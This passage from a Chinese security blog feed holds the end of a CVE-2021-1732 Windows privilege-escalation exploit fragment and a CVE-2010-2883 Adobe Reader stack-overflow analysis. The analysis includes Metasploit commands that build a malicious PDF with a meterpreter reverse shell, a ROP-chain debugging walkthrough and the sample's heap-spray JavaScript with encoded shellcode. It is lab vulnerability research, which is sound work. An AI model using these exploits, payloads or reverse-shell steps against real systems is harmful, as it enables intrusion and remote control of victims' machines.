<span class="token number">0</span><span class="token punctuation">;</span>ulValue <span class="token operator">=</span> <span class="token function">ReadPrimitive</span><span class="token punctuation">(</span>hTargetWnd<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//这里读取到目标窗口上的flag数据（准备被删除0x800属性）</span><span class="token function">SetWindowLongPtr</span><span class="token punctuation">(</span>hTargetWnd<span class="token punctuation">,</span> GWLP_ID<span class="token punctuation">,</span> <span class="token number">0x0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 将目标窗口载入的Spmenu设置为0</span><span class="token function">SetWindowLong</span><span class="token punctuation">(</span>hTargetWnd<span class="token punctuation">,</span> TAGWND_BODY_STYLE_OFF<span class="token punctuation">,</span> <span class="token number">0x04c00000</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 将目标窗口中的style还原</span><span class="token function">SetWindowLongPtr</span><span class="token punctuation">(</span>hTargetWnd<span class="token punctuation">,</span> TAGWND_BODY_REL_FLAG_OFF<span class="token punctuation">,</span> ulValue <span class="token operator">&amp;</span> <span class="token operator">~</span><span class="token number">0x800</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 将目标窗口中的flag删除0x800属性</span><span class="token function">SetWindowLongPtr</span><span class="token punctuation">(</span>hTargetWnd<span class="token punctuation">,</span> TAGWND_BODY_REL_VALUE_OFF<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 将目标窗口的扩展内存设置为0</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x03-补丁分析"><a href="#0x03-补丁分析" class="headerlink" title="0x03 补丁分析"></a>0x03 补丁分析</h2><p>补丁打在了win32kfull!xxxCreateWindowEx</p><p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220809111624710.png"></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2010-2883 Adobe Reader栈溢出分析</title>
      <link href="/2022/01/14/CVE-2010-2883%20Adobe%20Reader%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/"/>
      <url>/2022/01/14/CVE-2010-2883%20Adobe%20Reader%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p>CVE-2010-2883是pdf阅读器Adobe Reader的一个栈溢出漏洞。</p><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>CVE-2010-2883是Adobe Reader和Acrobat中的CoolType.dll库在解析文字文件SING表中的uniqueName时调用的strcat函数未检查长度存在的栈溢出漏洞，当用户打开特定的pdf文件就有可能导致任意代码执行。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Adobe Reader 8.2.4 - 9.3.4</p><h2 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h2><table><thead><tr><th>.</th><th>环境</th></tr></thead><tbody><tr><td>操作系统</td><td>win xp(ip:192.168.17.143) kali2019(ip:192.168.17.145)</td></tr><tr><td>虚拟机</td><td>VMware 15</td></tr><tr><td>调试器</td><td>OllDbg</td></tr><tr><td>反汇编器</td><td>IDA7.0</td></tr><tr><td>漏洞软件</td><td>Adobe Reader 9.3.4</td></tr></tbody></table><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>1.进入msfconsole</p><p>2.搜索Adobe渗透模块</p><p><code>search adobe_cooltype_sing</code></p><p>3.调用渗透模块</p><p>`use exploit/windows/fileformat/adobe_cooltype_sing/</p><p>4.查看模块详情</p><p><code>info</code></p><p>5.调用meterpreter载荷，反向连接到渗透机</p><p><code>set payload windows/meterpreter/reverse_tcp</code></p><p>6.设置Kali Linux的IP地址</p><p><code>set LHOST 192.168.17.145</code></p><p>7.设置本地监听端口</p><p><code>set LPORT 8888</code></p><p>8.设置带有后门程序的PDF文件</p><p><code>set FILENAME PINGINGLAB.pdf</code></p><p>9.执行生成文件,文件在/root/.msf4/local/PINGINGLAB.pdf</p><p><code>exploit</code></p><p>10.将PDF木马文件拷贝至Kali Linux桌面</p><p>`cp /root/.msf4/local/PINGINGLAB.pdf </p><p><code>/root/Desktop/PINGINGLAB.pdf</code></p><p>11.Metasploit开启shell监听会话，等待肉鸡上线</p><p>12.使用handler监听模块</p><p><code>use exploit/multi/handler</code></p><p>13.回弹一个tcp连接</p><p><code>set payload windows/meterpreter/reverse_tcp</code></p><p>14.设置监听IP地址</p><p><code>set LHOST 192.168.17.143</code></p><p>15.设置监听的端口</p><p><code>set LPORT 8888</code></p><p>16.开启监听</p><p><code>exploit</code></p><p>17.将PDF木马文件拷贝到Win xp并打开</p><p>这时Metasploit获取shell会话，并用Meterpreter控制肉鸡</p><p>查看系统信息<br>sysinfo</p><p>查看当前用户</p><p>getuid</p><p><img src="/2022/01/14/CVE-2010-2883%20Adobe%20Reader%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20250617082245971.png"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h3><h4 id="定位触发点"><a href="#定位触发点" class="headerlink" title="定位触发点"></a>定位触发点</h4><p>CoolType.dll（在安装目录Reader 9.0\Reader\下 ）在解析SING表中的uniqueName时存在栈溢出漏洞。用ida反汇编CoolType.dll库，查看字符串发现SING字样，这个地方是漏洞解析出错的地方，直接定位进去就能查看这个库对sing表格的解析方式，主要是stract造成的栈溢出。</p><p><img src="/2022/01/14/CVE-2010-2883%20Adobe%20Reader%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20250617082341968.png"></p><pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">.text:0803DBF2                 push    ebp.text:0803DBF3                 sub     esp, 104h       ; 分配空间.text:0803DBF9                 lea     ebp, [esp-4]    ; strcat将执行结果保存在ebp中.text:0803DBFD                 mov     eax, ___security_cookie.text:0803DC02                 xor     eax, ebp.text:0803DC04                 mov     [ebp+108h+var_4], eax.text:0803DC0A                 push    4Ch.text:0803DC0C                 mov     eax, offset loc_81847C4.text:0803DC11                 call    __EH_prolog3_catch.text:0803DC16                 mov     eax, [ebp+108h+arg_C].text:0803DC1C                 mov     edi, [ebp+108h+arg_0].text:0803DC22                 mov     ebx, [ebp+108h+arg_4].text:0803DC28                 mov     [ebp+108h+var_130], edi.text:0803DC2B                 mov     [ebp+108h+var_138], eax.text:0803DC2E                 call    sub_8041626.text:0803DC33                 xor     esi, esi.text:0803DC35                 cmp     dword ptr [edi+8], 3.text:0803DC39 ;   try {.text:0803DC39                 mov     [ebp+108h+var_10C], esi.text:0803DC3C                 jz      loc_803DDF9.text:0803DC42                 mov     [ebp+108h+var_124], esi.text:0803DC45                 mov     [ebp+108h+var_120], esi.text:0803DC48                 cmp     dword ptr [edi+0Ch], 1.text:0803DC48 ;   } // starts at 803DC39.text:0803DC4C ;   try {.text:0803DC4C                 mov     byte ptr [ebp+108h+var_10C], 1.text:0803DC50                 jnz     loc_803DDA2.text:0803DC56                 push    offset aName    ; "name".text:0803DC5B                 push    edi             ; int.text:0803DC5C                 lea     ecx, [ebp+108h+var_124].text:0803DC5F                 mov     [ebp+108h+var_119], 0.text:0803DC63                 call    sub_802178F.text:0803DC68                 cmp     [ebp+108h+var_124], esi.text:0803DC6B                 jnz     short loc_803DCD6.text:0803DC6D                 push    offset aSing    ; "SING".text:0803DC72                 push    edi             ; int.text:0803DC73                 lea     ecx, [ebp+108h+var_12C] ; 指向虚表的指针，这里指向sing表的入口.text:0803DC76                 call    sub_8021ABE     ; 处理sing表.text:0803DC7B                 mov     eax, [ebp+108h+var_12C].text:0803DC7E                 cmp     eax, esi        ; 判断是否为空.text:0803DC7E ;   } // starts at 803DC4C.text:0803DC80 ;   try {.text:0803DC80                 mov     byte ptr [ebp+108h+var_10C], 2.text:0803DC84                 jz      short loc_803DCBD ; 不跳转.text:0803DC86                 mov     ecx, [eax]      ; 版本号.text:0803DC88                 and     ecx, 0FFFFh.text:0803DC8E                 jz      short loc_803DC98 ; 跳转.text:0803DC90                 cmp     ecx, 100h.text:0803DC96                 jnz     short loc_803DCB9.text:0803DC98.text:0803DC98 loc_803DC98:                            ; CODE XREF: sub_803DBF2+9C↑j.text:0803DC98                 add     eax, 10h        ; 寻找uniqueName，相对sing表入口偏移0x10.text:0803DC9B                 push    eax             ; char *.text:0803DC9C                 lea     eax, [ebp+108h+var_108] ; 目的地址是一段固定大小的栈空间，就是前面申请的空间.text:0803DC9F                 push    eax             ; char *.text:0803DCA0                 mov     [ebp+108h+var_108], 0 .text:0803DCA4                 call    strcat ;造成溢出<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>strcat函数</strong><br>char * strcat(char * dest, const char * src);<br>strcat会将参数src字符串复制到参数dest所指的字符串尾部，dest最后的结束字符NULL会被覆盖掉，并在连接后的字符串尾部再增加一个NULL。</p><h4 id="SING数据结构分析"><a href="#SING数据结构分析" class="headerlink" title="SING数据结构分析"></a>SING数据结构分析</h4><p>PdfStreamDumper，用工具导入利用漏洞的PDF文件，在Object中找到Sing的Object，右键选择Save Decompressed Streams保存到本地。<br>TableEntry数据结构在官方文档定义如下：</p><pre class="line-numbers language-none"><code class="language-none">typedef sturct_SING{    char tag[4];//"SING"    ULONG checkSum;//校验和    ULONG offset;//相对文件偏移    ULONG length;//数据长度} TableEntry;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>样本中，SING表的形态：</p><pre class="line-numbers language-none"><code class="language-none">Char tag[4]; //53 49 4E 47ULONG checkSum;  //D9 BC C8 B5ULONG offset; //00 00 01 1CULONG length; //00 00 1D DF<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2022/01/14/CVE-2010-2883%20Adobe%20Reader%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20250617082636999.png"></p><p>SING数据是0x11C开始的,SING数据长度为0x1DDF，SING从真实数据偏移0x10为uniqueName域,入口偏移0x11c是SING表的真实数据，也就是从00 00 01 00开始的部分偏移0x10就能找到uniqueName域(uniqueName域是个28字节大小的结构)，执行strcat后，会将58 E0 8D AD起始的复制到ebp指定的地址中，直到遇到NULL字符串终止符。</p><h3 id="ollydbg动态调试"><a href="#ollydbg动态调试" class="headerlink" title="ollydbg动态调试"></a>ollydbg动态调试</h3><p>先打开Adobe Reader,再打开OllyDbg,attach上Adobe Reader进程，f9运行，此时OllyDbg显示当前调试的程序是运行状态，实际上这个时候Adobe Reader就已经加载了CoolType.dll文件了。通过刚刚的静态分析我们了解到SING在地址0803DC6D处被引用，Ctrl+G输入0x0803DC6D回车跳转到该地址F2下断点。</p><p><img src="/2022/01/14/CVE-2010-2883%20Adobe%20Reader%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20250617082718853.png"></p><h4 id="获取SING表的入口地址"><a href="#获取SING表的入口地址" class="headerlink" title="获取SING表的入口地址"></a>获取SING表的入口地址</h4><p>将样本拖入Adobe Reader中，程序就会停在刚才下的断点上面,f7单步运行到以下位置。</p><p><img src="/2022/01/14/CVE-2010-2883%20Adobe%20Reader%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20250617082840411.png"></p><p>ECX指向0012EB00，数据窗口窗口跟随查看这个指针里存放的数据。</p><p><img src="/2022/01/14/CVE-2010-2883%20Adobe%20Reader%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20250617082903814.png"></p><p><img src="/2022/01/14/CVE-2010-2883%20Adobe%20Reader%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20250617082921342.png"></p><p>在TrueType字体文件中，从0字节偏移的位置开始有一个表目录。且这个表目录的第一个字段是名为sfnt version是用来表明所用ttf格式版本的字段。在文档中清楚的说明了，对于1.0版本的TTF字体文件开头要用0x00010000来表示版本。075E3B70处的数据正好是0x00010000,所以此时ecx中保存的是SING的版本号。</p><p>之后调用call指令，将SING字符串当作参数了，这个call实际上是在处理SING表，f8步过，继续单步</p><p><img src="/2022/01/14/CVE-2010-2883%20Adobe%20Reader%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20250617082955034.png"></p><p><img src="/2022/01/14/CVE-2010-2883%20Adobe%20Reader%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20250617083015616.png"></p><p>eax是072f3924,用pdfStreamDumper取出PDF样本中的TTF文件,TTF中关于SING表的TableEntry结构数据如下图</p><p><img src="/2022/01/14/CVE-2010-2883%20Adobe%20Reader%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20250617083035733.png"></p><p>在文件偏移0x11C处即是SING表的真实数据</p><p><img src="/2022/01/14/CVE-2010-2883%20Adobe%20Reader%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20250617083055625.png"></p><p>这里的数据和eax所指的072F3924处的内容一样，所以call指令的作用是取SING表的入口地址。</p><p><img src="/2022/01/14/CVE-2010-2883%20Adobe%20Reader%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20250617083115179.png"></p><p>cmp eax,esi这里是比较eax和esi的值，检测SING是否为空，eax的值是072f3924，esi的值是0，所以不会跳转。继续向下执行</p><p><img src="/2022/01/14/CVE-2010-2883%20Adobe%20Reader%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20250617083138026.png"></p><p>mov ecx,dword ptr ds:[eax]这里的取出eax的内容赋给ecx（之前保存的是ttf的版本号）</p><p>and ecx,0xFFFF这里清掉低4位，结果为零，je跳转，继续往下</p><p><img src="/2022/01/14/CVE-2010-2883%20Adobe%20Reader%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20250617083204002.png"></p><p>这里执行add eax,0x10后，eax原来执行SING表，SING表加上0x10处指向unique域</p><p><img src="/2022/01/14/CVE-2010-2883%20Adobe%20Reader%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20250617083224936.png"></p><h4 id="找到溢出点"><a href="#找到溢出点" class="headerlink" title="找到溢出点"></a>找到溢出点</h4><p>继续执行找到溢出点</p><p><img src="/2022/01/14/CVE-2010-2883%20Adobe%20Reader%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20250617083257260.png"></p><p>将uniqueName域和当前的ebp入栈，然后调用strcat进行字符串拼接，但是没有进行安全检查，导致溢出，我们单步步过strcat后查看一下ebp开始的栈区数据</p><p><img src="/2022/01/14/CVE-2010-2883%20Adobe%20Reader%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20250617083326358.png"></p><p>此时栈溢出已经发生，函数的返回地址已经被覆盖为SING表中的恶意数据</p><p><img src="/2022/01/14/CVE-2010-2883%20Adobe%20Reader%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20250617083344437.png"></p><h4 id="返回地址"><a href="#返回地址" class="headerlink" title="返回地址"></a>返回地址</h4><p>返回地址位于icucnv32.dll中，IMAGE_OPTIONAL_HEADER中IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE 的值为0，所以这个模块没有开启ASLR，这就保证了exp的稳定性</p><p><img src="/2022/01/14/CVE-2010-2883%20Adobe%20Reader%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20250617083411546.png"></p><p>执行到0x0808B1C0时，eax的值是0012E6D0,这个地址也是在icucnv32.dll中,f7跟进</p><p><img src="/2022/01/14/CVE-2010-2883%20Adobe%20Reader%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20250617083430416.png"></p><p>这里是ROP指令，首先执行add ebp,0x794 执行这条指令后ebp的值为0012E4DC</p><p><img src="/2022/01/14/CVE-2010-2883%20Adobe%20Reader%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20250617083454206.png"></p><p>ebp调整到strcat函数调用后的栈区数据范围内，接下来执行leave，修改了esp为0012E4E0</p><p><img src="/2022/01/14/CVE-2010-2883%20Adobe%20Reader%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20250617083519181.png"></p><p>执行retn会跳转到0x4A82A714地址处</p><p><img src="/2022/01/14/CVE-2010-2883%20Adobe%20Reader%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20250617083537239.png"></p><p>继续F7单步</p><p><img src="/2022/01/14/CVE-2010-2883%20Adobe%20Reader%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20250617083554005.png"></p><p>继续F7单步执行完pop esp后，esp将被修改为0x0C0C0C0C,然后返回</p><p><img src="/2022/01/14/CVE-2010-2883%20Adobe%20Reader%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20250617083615347.png"></p><h3 id="HeapSpray"><a href="#HeapSpray" class="headerlink" title="HeapSpray"></a>HeapSpray</h3><p>在进行HeapSpray时，一般会将EIP控制到0x0C0C0C0C，利用javascript申请大量的堆内存块，并用包含着0x90(nop)和shellcode的内存片覆盖这些内存。通常javascript会从内存低址向高址分配内存，因此申请的内存超过200MB(200MB=200x1024x1024=0xC800000&gt;0x0C0C0C0C)后，0x0C0C0C0C就会被含有shellcode的内存块覆盖。只要内存片中的0x90能够命中0x0C0C0C0C的位置，通过滑行，就可以执行到shellcode。而上图中的0x0C0C0C0C是样本特意构造的，是为了实现HeapSpary堆喷射技术，因为PDF本身支持执行JS的特性，将ShellCode借助JS写入内存中。栈中的数据就是JS代码中的ShellCode，然后利用它来实现ROP以绕过DEP保护。</p><p>可以通过PDFStreamDumper工具提取样本中实现堆喷射的JS代码，看到的代码是经过混淆的</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">var shellcode <span class="token operator">=</span> unescape<span class="token punctuation">(</span> <span class="token string">'%u4141%u4141%u63a5%u4a80%u0000%u4a8a%u2196%u4a80%u1f90%u4a80%u903c%u4a84%ub692%u4a80%u1064%u4a80%u22c8%u4a85%u0000%u1000%u0000%u0000%u0000%u0000%u0002%u0000%u0102%u0000%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9038%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0000%u0000%u0040%u0000%u0000%u0000%u0000%u0001%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9030%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0022%u0000%u0000%u0000%u0000%u0000%u0000%u0001%u63a5%u4a80%u0004%u4a8a%u2196%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0030%u0000%ua8a6%u4a80%u1f90%u4a80%u0004%u4a8a%ua7d8%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0020%u0000%ua8a6%u4a80%u63a5%u4a80%u1064%u4a80%uaedc%u4a80%u1f90%u4a80%u0034%u0000%ud585%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u000a%u0000%ua8a6%u4a80%u1f90%u4a80%u9170%u4a84%ub692%u4a80%uffff%uffff%uffff%uffff%uffff%uffff%u1000%u0000%u6dba%u42a5%udd5e%ud9c4%u2474%u5df4%uc931%u31b1%uc583%u3104%u0f55%u5503%u4762%ua2b7%u0594%u5b38%u6a64%ubeb0%uaa55%ucba6%u1ac5%u9eac%ud1e9%u0ae0%u977a%u3c2c%u12cb%u730b%u0fcc%u126f%u524e%uf4bc%u9d6f%uf5b1%uc0a8%ua738%u8e61%u58ef%uda06%ud233%uca54%u0733%ued2c%u9612%ub427%u18b4%ucce4%u02fc%ue9e9%ub9b7%u86d9%u6849%u6610%u55e5%u959d%u92f7%u4619%uea82%ufb5a%u2895%u2721%uab13%uac81%u1783%u6030%ud355%ucd3e%ubb11%ud022%ub7f6%u595e%u17f9%u19d7%ub3de%ufabc%ue57f%uac18%uf580%u11c3%u7d25%u46e9%udc54%u9867%u5aea%u9ac5%u64f4%uf379%uefc5%u8416%u25d9%u7a53%u6490%u13f5%ufd7d%u7e44%u2b7e%u878a%udefd%u7c72%uab1d%u3877%u4799%u5105%u684c%u52ba%u0b45%uc15d%ue205%u61f8%ufaaf'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>var block <span class="token operator">=</span> unescape<span class="token punctuation">(</span> <span class="token string">"%"</span> <span class="token operator">+</span> <span class="token string">"u"</span> <span class="token operator">+</span> <span class="token string">"0"</span> <span class="token operator">+</span> <span class="token string">"c"</span> <span class="token operator">+</span> <span class="token string">"0"</span> <span class="token operator">+</span> <span class="token string">"c"</span> <span class="token operator">+</span> <span class="token string">"%u"</span> <span class="token operator">+</span> <span class="token string">"0"</span> <span class="token operator">+</span> <span class="token string">"c"</span> <span class="token operator">+</span> <span class="token string">"0"</span> <span class="token operator">+</span> <span class="token string">"c"</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span>block<span class="token punctuation">.</span>length <span class="token operator">+</span> <span class="token number">20</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">&lt;</span> <span class="token number">65536</span><span class="token punctuation">)</span> block<span class="token operator">+=</span>block<span class="token punctuation">;</span>SP <span class="token operator">=</span> block<span class="token punctuation">.</span>substring<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">0x0c0c</span><span class="token operator">-</span><span class="token number">0x24</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>SP <span class="token operator">+=</span> shellcode<span class="token punctuation">;</span>SP <span class="token operator">+=</span> block<span class="token punctuation">;</span>slackspace <span class="token operator">=</span> SP<span class="token punctuation">.</span>substring<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">65536</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span>slackspace<span class="token punctuation">.</span>length <span class="token operator">&lt;</span> <span class="token number">0x80000</span><span class="token punctuation">)</span> <span class="token operator">//</span><span class="token number">2</span><span class="token operator">^</span><span class="token number">19</span><span class="token operator">=</span><span class="token number">524288</span>slackspace <span class="token operator">+=</span> slackspace<span class="token punctuation">;</span>bigblock <span class="token operator">=</span> slackspace<span class="token punctuation">.</span>substring<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x80000</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token number">0x1020</span><span class="token operator">-</span><span class="token number">0x08</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var memory <span class="token operator">=</span> new Array<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span>count<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>count<span class="token operator">&lt;</span><span class="token number">0x1f0</span><span class="token punctuation">;</span>count<span class="token operator">+</span><span class="token operator">+</span><span class="token punctuation">)</span> memory<span class="token punctuation">[</span>count<span class="token punctuation">]</span><span class="token operator">=</span>bigblock<span class="token operator">+</span><span class="token string">"s"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>平常的HeapSpray代码都是使用%u9090(NOP)进行填充，这里的%u0C0C相当于OR AL,0CH 这样的指令执行的效果对al寄存器不会产生任何影响，和后面的shellcode代码无关。NOP SLED在整个内存块中所占比例较大，所以当控制EIP转到0x0C0C0C0C执行时，命中NOP SLED的几率比较大。实现堆喷射的关键在new Array()，利用数据来开辟内存区域，然后通过填充数据的方式来喷射ShellCode</p><h3 id="利用ROP链绕过DEP保护"><a href="#利用ROP链绕过DEP保护" class="headerlink" title="利用ROP链绕过DEP保护"></a>利用ROP链绕过DEP保护</h3><p><img src="/2022/01/14/CVE-2010-2883%20Adobe%20Reader%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20250617083759027.png"></p><p>执行pop ecx ,ecx的值变成4A8A0000,储存UTF-32字符串</p><p><img src="/2022/01/14/CVE-2010-2883%20Adobe%20Reader%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20250617083819059.png"></p><p>继续执行，eax是0012E6D0</p><p><img src="/2022/01/14/CVE-2010-2883%20Adobe%20Reader%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20250617083835946.png"></p><p>执行完mov dword ptr:[ecx],eax后，原本存“UTF-32”字符串的地方保存eax的值</p><p><img src="/2022/01/14/CVE-2010-2883%20Adobe%20Reader%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20250617083857152.png"></p><p>之后返回，继续执行eax指向了CreateFileA</p><p><img src="/2022/01/14/CVE-2010-2883%20Adobe%20Reader%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20250617083919701.png"></p><p>跳转执行CreateFileA，查看CreateFileA在栈区的参数,这里以隐藏的方式创建了一个临时文件iso88591，可以在当前样本的同路径下找到</p><p><img src="/2022/01/14/CVE-2010-2883%20Adobe%20Reader%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20250617083943538.png"></p><p>Ctrl+F9返回</p><p><img src="/2022/01/14/CVE-2010-2883%20Adobe%20Reader%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20250617084000145.png"></p><p>继续执行跳转到0x4A8063A5</p><p><img src="/2022/01/14/CVE-2010-2883%20Adobe%20Reader%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20250617084015243.png"></p><p>执行pop ecx,将ecx赋值为4A801064</p><p><img src="/2022/01/14/CVE-2010-2883%20Adobe%20Reader%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20250617084033638.png"></p><p>执行ret，跳转到4A842DB2</p><p><img src="/2022/01/14/CVE-2010-2883%20Adobe%20Reader%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20250617084051109.png"></p><p>执行xchg eax,edi交换eax和edi寄存器的值</p><p><img src="/2022/01/14/CVE-2010-2883%20Adobe%20Reader%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20250617084107404.png"></p><p>之后跳转到4A802AB1</p><p><img src="/2022/01/14/CVE-2010-2883%20Adobe%20Reader%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20250617084134405.png"></p><p>执行完pop ebp，ebp的值变为0x8</p><p><img src="/2022/01/14/CVE-2010-2883%20Adobe%20Reader%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20250617084153291.png"></p><p>跳转到4A80A8A6</p><p><img src="/2022/01/14/CVE-2010-2883%20Adobe%20Reader%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20250617084208540.png"></p><p>指向了一个函数的实现模块</p><p><img src="/2022/01/14/CVE-2010-2883%20Adobe%20Reader%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20250617084228693.png"></p><p>用CreateFileMappingA，创建文件映射对象,然后去执行MapViewOfFile，将一个文件映射对象映射到当前程序的地址空间</p><p><img src="/2022/01/14/CVE-2010-2883%20Adobe%20Reader%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20250617084300786.png"></p><p>之后调用memcpy</p><p><img src="/2022/01/14/CVE-2010-2883%20Adobe%20Reader%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20250617084318287.png"></p><p>参数如下图</p><p><img 